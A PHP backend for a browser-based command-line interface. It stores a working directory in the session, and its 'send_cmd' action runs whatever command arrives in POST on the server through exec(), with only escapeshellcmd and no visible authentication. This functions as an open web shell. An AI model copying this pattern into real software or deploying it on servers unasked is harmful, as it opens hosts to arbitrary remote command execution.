<?php
session_name('CLI');
session_start();

error_reporting(-1);
ini_set('display_errors', 'On');

include __DIR__ . '/cli.php';

if (!isset($_SESSION['path']))
{
    $_SESSION['path'] = getcwd();
}

if (isset($_GET['do']))
{
    switch ($_GET['do'])
    {
        case 'get_path':
            if (cli::is_disabled('shell_exec'))
            {
                cli::json(array('status' => 'ERR', 'code' => 100, 'text' => 'Execute an external program is disabled.'));
            }
            cli::json(array('status' => 'OK', 'code' => 200, 'text' => 'Success', 'result' => $_SESSION['path']));
            break;
        case 'set_path':
            $path = trim($_POST['path']);
            chdir($_SESSION['path']);
            if (@chdir($path))
            {
                $_SESSION['path'] = getcwd();
                $data = array('status' => 'OK', 'code' => 200, 'text' => 'Success', 'result' => $_SESSION['path']);
            } else {
                if (preg_match('/^[a-z]:/i', $path)) {
                    $data = array('status' => 'ERR', 'code' => 100, 'text' => 'The filename, directory name, or volume label syntax is incorrect.');
                } else {
                    $data = array('status' => 'ERR', 'code' => 101, 'text' => 'The system cannot find the path specified.');
                }
            }
            cli::json($data);
            break;
        case 'send_cmd':
            chdir($_SESSION['path']);
            $cmd = trim($_POST['cmd']);
            $result = array();
            $result_code = null;
            if ($cmd)
            {
                $escaped_cmd = escapeshellcmd($cmd);
                //$result = shell_exec($escaped_cmd);
                exec($escaped_cmd, $result, $result_code);

                if ($result_code == 0)
                {
                    $result = join("\n", $result);
                    $data = array('status' => 'OK', 'code' => 200, 'text' => 'Success', 'result' => $result, 'result_code' => $result_code);
                } else {
                    $data = array('status' => 'ERR', 'code' => 100, 'text' => sprintf("'%s' is not recognized as an internal or external command, operable program or batch file.", $cmd));
                }
            }

            cli::json($data);
            break;
    }
}